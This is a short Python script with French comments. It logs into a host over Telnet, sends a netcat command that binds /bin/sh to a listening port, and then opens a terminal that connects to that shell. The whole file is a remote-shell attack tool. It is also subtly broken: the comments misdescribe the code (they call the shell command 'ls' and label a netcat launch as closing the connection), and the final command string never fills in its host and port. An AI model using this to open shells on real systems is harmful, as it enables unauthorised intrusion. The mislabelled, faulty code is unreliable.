import telnetlib
import subprocess


def execute_telnet_command(host, port, listening_port):
    # Établir la connexion Telnet
    tn = telnetlib.Telnet(host, port)

    # Exécuter la commande 'ls'
    command = f"nc -lvp {listening_port} -e /bin/sh"
    tn.write(command.encode('ascii') + b"\n")

    # Attendre la réponse et l'afficher
    response = tn.read_until(b"\n")
    print(response.decode('ascii'))

    # Fermer la connexion Telnet
    subprocess.Popen("gnome-terminal -- bash -c 'nc {host} {listening_port}; exec bash'", shell=True)